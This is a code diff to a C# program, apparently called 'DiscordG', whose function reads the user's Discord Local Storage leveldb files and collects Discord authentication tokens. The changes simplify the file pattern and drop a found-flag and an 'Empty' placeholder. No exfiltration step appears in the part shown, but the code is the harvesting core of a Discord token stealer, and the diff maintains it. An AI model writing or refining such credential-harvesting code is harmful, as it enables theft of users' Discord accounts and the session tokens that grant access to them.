@@ -23,7 +23,7 @@ namespace DiscordG
             List<string> discordtokens = new List<string>();
             DirectoryInfo rootfolder = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\Discord\Local Storage\leveldb");
 
-            foreach (var file in rootfolder.GetFiles(false ? "*.log" : "*.ldb"))
+            foreach (var file in rootfolder.GetFiles("*.ldb"))
             {
                 string readedfile = file.OpenText().ReadToEnd();
 
@@ -36,17 +36,9 @@ namespace DiscordG
 
 
             discordtokens = discordtokens.ToList();
-
+            
             Console.WriteLine(discordtokens);
-
-            if (discordtokens.Count > 0)
-            {
-                foundSth = true;
-                
-            }
-            else
-                discordtokens.Add("Empty");
-
+            
             return discordtokens;
         }
 
